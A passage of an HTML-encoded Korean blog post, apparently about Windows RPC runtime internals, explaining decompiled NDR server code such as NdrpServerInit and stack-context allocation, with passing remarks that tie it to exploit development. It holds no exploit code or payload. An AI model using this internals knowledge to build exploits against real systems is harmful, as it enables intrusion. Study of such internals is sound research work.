  v91 = &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( AllignedStackSize + &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt; &amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt; )
    v91 = AllignedStackSize + &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;;
  v92 = (_LIST_ENTRY *)I_RpcBCacheAllocate(v91);
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !v92 )
    RpcRaiseException(&lt;span class=&#34;hljs-number&#34;&gt;14&lt;/span&gt;);
  v93 = NdrProcContext.AllocateContext.MemoryList.Flink;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( NdrProcContext.AllocateContext.MemoryList.Flink-&amp;gt;Blink != &amp;amp;NdrProcContext.AllocateContext.MemoryList )
    __fastfail(&lt;span class=&#34;hljs-number&#34;&gt;3u&lt;/span&gt;);
  v92-&amp;gt;Flink = NdrProcContext.AllocateContext.MemoryList.Flink;
  v92-&amp;gt;Blink = &amp;amp;NdrProcContext.AllocateContext.MemoryList;
  v93-&amp;gt;Blink = v92;
  NdrProcContext.AllocateContext.MemoryList.Flink = v92;
  args3 = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *)&amp;amp;v92[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;];
  BytesRemaining = v91 - &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;i64;
  StackSize2 = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)NdrProcContext.StackSize;
}
&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
{
  args3 = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *)NdrProcContext.AllocateContext.pBlockPointer;
}
args = args3;
v112 = args3;
NdrProcContext.AllocateContext.pBlockPointer = (__int64)&amp;amp;args3[v13];
NdrProcContext.AllocateContext.BytesRemaining = BytesRemaining - v13;
v109 = args3;
memset_0(args3, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, StackSize2);
NdrProcContext.StartofStack = args;
pStubMsg.pContext = &amp;amp;NdrProcContext;
pStubMsg.ContextHandleHash = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC774;&amp;#xD6C4; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xB41C; Context&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xC778;&amp;#xC790; &amp;#xC804;&amp;#xB2EC;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB420; &amp;#xC2A4;&amp;#xD0DD; &amp;#xACF5;&amp;#xAC04;&amp;#xC744; &amp;#xD560;&amp;#xB2F9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;NdrProcContext&lt;/code&gt;&amp;#xC5D0;&amp;#xB294; &lt;code&gt;AllocateContext&lt;/code&gt;&amp;#xB77C;&amp;#xB294; &amp;#xD544;&amp;#xB4DC;&amp;#xAC00; &amp;#xC788;&amp;#xB294;&amp;#xB370; &lt;code&gt;NdrProcContext&lt;/code&gt;&amp;#xAC00; &amp;#xC2A4;&amp;#xD0DD; &amp;#xBCC0;&amp;#xC218;&amp;#xC774;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC774; &amp;#xB610;&amp;#xD55C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xC8E0;. &lt;code&gt;AllocateContext.PreAllocatedBlock&lt;/code&gt;&amp;#xC758; &amp;#xD06C;&amp;#xAE30;&amp;#xB294; 0x200&amp;#xC778;&amp;#xB370; ProcString&amp;#xC73C;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xB41C; &lt;code&gt;StackSize&lt;/code&gt;&amp;#xAC00; &amp;#xC774;&amp;#xBCF4;&amp;#xB2E4; &amp;#xD06C;&amp;#xBA74; &amp;#xCD94;&amp;#xAC00;&amp;#xC801;&amp;#xC778; &amp;#xD560;&amp;#xB2F9;&amp;#xC774; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xADF8;&amp;#xB807;&amp;#xAC8C; &amp;#xB9CE;&amp;#xC740; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC9C4; &amp;#xC54A;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC124;&amp;#xBA85;&amp;#xC740; &amp;#xC0DD;&amp;#xB7B5;&amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314E;&amp;#x314E;&lt;br&gt;&amp;#xBB34;&amp;#xD2BC;! &lt;code&gt;AllocateContext.pBlockPointer&lt;/code&gt;&amp;#xC758; &amp;#xAC12;&amp;#xC744; &lt;code&gt;arg&lt;/code&gt;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xACE0; &lt;code&gt;StackSize&lt;/code&gt;&amp;#xB9CC;&amp;#xD07C; &lt;code&gt;pBlockPointer&lt;/code&gt;&amp;#xB97C; &amp;#xC99D;&amp;#xAC00;&amp;#xC2DC;&amp;#xD0B5;&amp;#xB2C8;&amp;#xB2E4;. ptmalloc2&amp;#xC5D0;&amp;#xC11C; Top Chunk&amp;#xB97C; &amp;#xD560;&amp;#xB2F9;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xB54C;&amp;#xC640; &amp;#xBE44;&amp;#xC2B7;&amp;#xD55C; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xD558;&amp;#xB124;&amp;#xC694; &amp;#x314E;&amp;#x314E; &lt;del&gt;&amp;#xC2DC;&amp;#xAC04;&amp;#xC774; &amp;#xB41C;&amp;#xB2E4;&amp;#xBA74; &amp;#xB9AC;&amp;#xB205;&amp;#xC2A4; &amp;#xD799; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xAE00;&amp;#xB3C4; &amp;#xC368;&amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&lt;/del&gt;&lt;br&gt;&amp;#xC774;&amp;#xD6C4; &amp;#xD560;&amp;#xB2F9;&amp;#xB41C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC744; 0&amp;#xC73C;&amp;#xB85C; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xD558;&amp;#xACE0; &lt;code&gt;pStubMsg.pContext&lt;/code&gt;&amp;#xAC00; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xB41C; &lt;code&gt;NdrProcContext&lt;/code&gt;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xAC8C; &amp;#xB418;&amp;#xBA70; Context Initialize &amp;#xACFC;&amp;#xC815;&amp;#xC740; &amp;#xB05D;&amp;#xC774; &amp;#xB0A9;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;Server-Initialize-NdrpServerInit&#34;&gt;&lt;a href=&#34;#Server-Initialize-NdrpServerInit&#34; class=&#34;headerlink&#34; title=&#34;Server Initialize (NdrpServerInit)&#34;&gt;&lt;/a&gt;Server Initialize (&lt;code&gt;NdrpServerInit&lt;/code&gt;)&lt;/h3&gt;&lt;p&gt;&amp;#xC774;&amp;#xD6C4; &lt;code&gt;NdrpServerInit&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;NdrpServerInit(&amp;amp;pStubMsg, pRpcMsga, MIDL_STUB_DESC, (__int64)pThis, (__int64)pChannel, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64);&lt;/code&gt;&lt;/pre&gt;&lt;br&gt;&amp;#xD638;&amp;#xCD9C;&amp;#xC5D0;&amp;#xB294; &lt;code&gt;StubMsg&lt;/code&gt;&amp;#xC640; &lt;code&gt;RpcMsg&lt;/code&gt;, &lt;code&gt;StubDesc&lt;/code&gt;&amp;#xAC00; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xB124;&amp;#xC694;. &lt;code&gt;pThis&lt;/code&gt;&amp;#xC640; &lt;code&gt;pChannel&lt;/code&gt;&amp;#xC740; &amp;#xBAA8;&amp;#xB450; NULL&amp;#xC774;&amp;#xB2C8; &amp;#xBB34;&amp;#xC2DC;&amp;#xD558;&amp;#xB3C4;&amp;#xB85D; &amp;#xD569;&amp;#xC2DC;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *__fastcall &lt;span class=&#34;hljs-title&#34;&gt;NdrpServerInit&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(struct _MIDL_STUB_MESSAGE *StubMsg, PRPC_MESSAGE pRpcMsg, &lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; _MIDL_STUB_DESC *pMidlStubDesc, __int64 a4, __int64 a5, __int64 a6)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  NDR_PROC_CONTEXT *Context; &lt;span class=&#34;hljs-comment&#34;&gt;// rbx&lt;/span&gt;
  __int64 v11; &lt;span class=&#34;hljs-comment&#34;&gt;// rax&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *StartOfStack; &lt;span class=&#34;hljs-comment&#34;&gt;// r14&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *v13; &lt;span class=&#34;hljs-comment&#34;&gt;// rax&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; v14; &lt;span class=&#34;hljs-comment&#34;&gt;// zf&lt;/span&gt;
  __int64 v15; &lt;span class=&#34;hljs-comment&#34;&gt;// rax&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *v16; &lt;span class=&#34;hljs-comment&#34;&gt;// rcx&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 *v17; &lt;span class=&#34;hljs-comment&#34;&gt;// rax&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *MyBuffer; &lt;span class=&#34;hljs-comment&#34;&gt;// rcx&lt;/span&gt;
  __int64 BufferLen; &lt;span class=&#34;hljs-comment&#34;&gt;// rax&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64 v20; &lt;span class=&#34;hljs-comment&#34;&gt;// rdx&lt;/span&gt;
  &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;THREAD&lt;/span&gt; *&lt;span class=&#34;hljs-title&#34;&gt;v21&lt;/span&gt;;&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;// rdx&lt;/span&gt;
  MALLOC_FREE_STRUCT *v22; &lt;span class=&#34;hljs-comment&#34;&gt;// rax&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *ProcDesc2; &lt;span class=&#34;hljs-comment&#34;&gt;// rax&lt;/span&gt;
  __int64 v24; &lt;span class=&#34;hljs-comment&#34;&gt;// rcx&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;hljs-title&#34;&gt;NDROLE_EXTENSION_ROUTINES_TABLE&lt;/span&gt; *&lt;span class=&#34;hljs-title&#34;&gt;v25&lt;/span&gt;;&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;// r13&lt;/span&gt;
  _LIST_ENTRY *v26; &lt;span class=&#34;hljs-comment&#34;&gt;// rax&lt;/span&gt;
  _LIST_ENTRY *v27; &lt;span class=&#34;hljs-comment&#34;&gt;// rcx&lt;/span&gt;
  _LIST_ENTRY *v28; &lt;span class=&#34;hljs-comment&#34;&gt;// rdx&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; (__stdcall *v29)(&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; *); &lt;span class=&#34;hljs-comment&#34;&gt;// rdx&lt;/span&gt;
  &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;hljs-title&#34;&gt;MALLOC_FREE_STRUCT&lt;/span&gt; *&lt;span class=&#34;hljs-title&#34;&gt;v30&lt;/span&gt;;&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;// rcx&lt;/span&gt;
  RPC_STATUS v31; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *v32; &lt;span class=&#34;hljs-comment&#34;&gt;// rcx&lt;/span&gt;
  RPC_STATUS v33; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;
  __int64 v34; &lt;span class=&#34;hljs-comment&#34;&gt;// [rsp+0h] [rbp-58h] BYREF&lt;/span&gt;

  Context = StubMsg-&amp;gt;pContext;
  v11 = Context-&amp;gt;pSyntaxInfo;
  StartOfStack = Context-&amp;gt;StartofStack;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v11 )
    v13 = *(&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 **)(v11 + &lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt;);
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    v13 = pMidlStubDesc-&amp;gt;pFormatTypes;
  v14 = Context-&amp;gt;HandleType == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
  Context-&amp;gt;DceTypeFormatString = (__int64)v13;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v14 )
  {
    v15 = Context-&amp;gt;pHandleFormatSave;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( *(_BYTE *)v15 == &lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt; )
    {
      v16 = &amp;amp;StartOfStack[*(&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 *)(v15 + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;)];
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( *(&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *)(v15 + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;) &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
        v16 = *(&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; **)v16;
      *(_QWORD *)v16 = pRpcMsg-&amp;gt;Handle;
    }
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( a5 )                                     &lt;span class=&#34;hljs-comment&#34;&gt;// a5 == 0&lt;/span&gt;
  {
    ...
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
  {
    v17 = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 *)Context-&amp;gt;&lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt;.NdrInfo.pProcDesc;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (v17[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )&lt;span class=&#34;hljs-comment&#34;&gt;//Flags&lt;/span&gt;
    {
      NdrServerInitializePartial(pRpcMsg, StubMsg, pMidlStubDesc, *v17);
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    {
      StubMsg-&amp;gt;_bf_c0 &amp;amp;= &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFEBD4&lt;/span&gt;;
      StubMsg-&amp;gt;IsClient = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
      StubMsg-&amp;gt;pAllocAllNodesContext = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      StubMsg-&amp;gt;pPointerQueueState = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      StubMsg-&amp;gt;IgnoreEmbeddedPointers = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
      StubMsg-&amp;gt;PointerBufferMark = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      StubMsg-&amp;gt;BufferLength = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
      StubMsg-&amp;gt;StackTop = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      StubMsg-&amp;gt;FullPtrXlatTables = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      *(_QWORD *)&amp;amp;StubMsg-&amp;gt;FullPtrRefId = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      StubMsg-&amp;gt;UniquePtrCount = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
      StubMsg-&amp;gt;dwDestContext = &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;;
      StubMsg-&amp;gt;pvDestContext = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      StubMsg-&amp;gt;pRpcChannelBuffer = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      StubMsg-&amp;gt;pArrayInfo = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      StubMsg-&amp;gt;RpcMsg = pRpcMsg;
      StubMsg-&amp;gt;Buffer = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)pRpcMsg-&amp;gt;Buffer;
      MyBuffer = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)pRpcMsg-&amp;gt;Buffer;
      StubMsg-&amp;gt;BufferStart = MyBuffer;
      BufferLen = pRpcMsg-&amp;gt;BufferLength;
      StubMsg-&amp;gt;_bf_c0 &amp;amp;= &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFF63F&lt;/span&gt;;
      StubMsg-&amp;gt;BufferEnd = &amp;amp;MyBuffer[BufferLen];
      StubMsg-&amp;gt;uFlags = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
      StubMsg-&amp;gt;uFlags2 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
      StubMsg-&amp;gt;pfnAllocate = pMidlStubDesc-&amp;gt;pfnAllocate;
      StubMsg-&amp;gt;pfnFree = pMidlStubDesc-&amp;gt;pfnFree;
      StubMsg-&amp;gt;StubDesc = pMidlStubDesc;
      StubMsg-&amp;gt;LowStackMark = &amp;amp;v34 - &lt;span class=&#34;hljs-number&#34;&gt;1525&lt;/span&gt;;
      StubMsg-&amp;gt;ReuseBuffer = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
      StubMsg-&amp;gt;dwStubPhase = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
      StubMsg-&amp;gt;CorrDespIncrement = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
      StubMsg-&amp;gt;pAsyncMsg = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      StubMsg-&amp;gt;pCorrInfo = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      StubMsg-&amp;gt;pCorrMemory = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      StubMsg-&amp;gt;pMemoryList = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      v20 = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64)NtCurrentTeb()-&amp;gt;ReservedForNtRpc;
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v20 )
      {
        v21 = (struct THREAD *)(v20 ^ &lt;span class=&#34;hljs-number&#34;&gt;0xABABABABDEDEDEDE&lt;/span&gt;ui64);
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (HANDLE)*((_QWORD *)v21 + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) != NtCurrentTeb()-&amp;gt;ClientId.UniqueThread )
          __fastfail(&lt;span class=&#34;hljs-number&#34;&gt;0x1E&lt;/span&gt;u);
      }
      &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
      {
        v21 = ThreadSelfHelper();
      }
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !v21 )
        RpcRaiseException(&lt;span class=&#34;hljs-number&#34;&gt;14&lt;/span&gt;);
      *((_QWORD *)v21 + &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;) = StubMsg;
      v22 = pMidlStubDesc-&amp;gt;pMallocFreeStruct;
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v22 )
      {
        v29 = v22-&amp;gt;pfnFree;
        v30 = pRpcSsDefaults;
        pRpcSsDefaults-&amp;gt;pfnAllocate = v22-&amp;gt;pfnAllocate;
        v30-&amp;gt;pfnFree = v29;
      }
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( pMidlStubDesc-&amp;gt;Version &amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;0xA0000&lt;/span&gt; )
        RpcRaiseException(&lt;span class=&#34;hljs-number&#34;&gt;1829&lt;/span&gt;);
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (pRpcMsg-&amp;gt;RpcFlags &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;) == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )  &lt;span class=&#34;hljs-comment&#34;&gt;// RpcFlags -&amp;gt; 0x1000&lt;/span&gt;
      {
        pRpcMsg-&amp;gt;RpcFlags = &lt;span class=&#34;hljs-number&#34;&gt;0x4000&lt;/span&gt;;
        v31 = I_RpcReceive(pRpcMsg, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v31 )
          RpcRaiseException(v31);
        StubMsg-&amp;gt;Buffer = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)pRpcMsg-&amp;gt;Buffer;
        v32 = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)pRpcMsg-&amp;gt;Buffer;
        StubMsg-&amp;gt;BufferStart = v32;
        StubMsg-&amp;gt;BufferEnd = &amp;amp;v32[pRpcMsg-&amp;gt;BufferLength];
      }
    }
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( a6 )                                     &lt;span class=&#34;hljs-comment&#34;&gt;// a6 == 0&lt;/span&gt;
  {
    ...
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (*(_BYTE *)(Context-&amp;gt;&lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt;.NdrInfo.pProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )&lt;span class=&#34;hljs-comment&#34;&gt;//Flags&lt;/span&gt;
    ((&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; (__usercall *)(struct _MIDL_STUB_MESSAGE *@&amp;lt;rcx&amp;gt;, struct _NDR_ALLOCA_CONTEXT *@&amp;lt;rdx&amp;gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *@&amp;lt;r8&amp;gt;, __int64@&amp;lt;r9&amp;gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;))NdrpPipesInitialize32)(
      StubMsg,
      (struct _NDR_ALLOCA_CONTEXT *)&amp;amp;Context-&amp;gt;AllocateContext,
      (&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)Context-&amp;gt;Params,
      (__int64)StartOfStack,
      Context-&amp;gt;NumberParams);
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (Context-&amp;gt;&lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt;.NdrInfo.InterpreterFlags &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
    StubMsg-&amp;gt;FullPtrXlatTables = NdrFullPointerXlatInit(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, XLAT_SERVER);
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    StubMsg-&amp;gt;FullPtrXlatTables = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
  StubMsg-&amp;gt;_bf_c0 |= &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;u;
  StubMsg-&amp;gt;StackTop = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)StartOfStack;
  StubMsg-&amp;gt;pUserMarshalList = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (Context-&amp;gt;&lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt;.NdrInfo.InterpreterFlags &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
    NdrRpcSsEnableAllocate(StubMsg);
  ProcDesc2 = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)Context-&amp;gt;&lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt;.NdrInfo.pProcDesc;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (ProcDesc2[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x40&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )&lt;span class=&#34;hljs-comment&#34;&gt;//Flags&lt;/span&gt;
  {
    ...
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; ProcDesc2;
}&lt;/code&gt;&lt;/pre&gt;
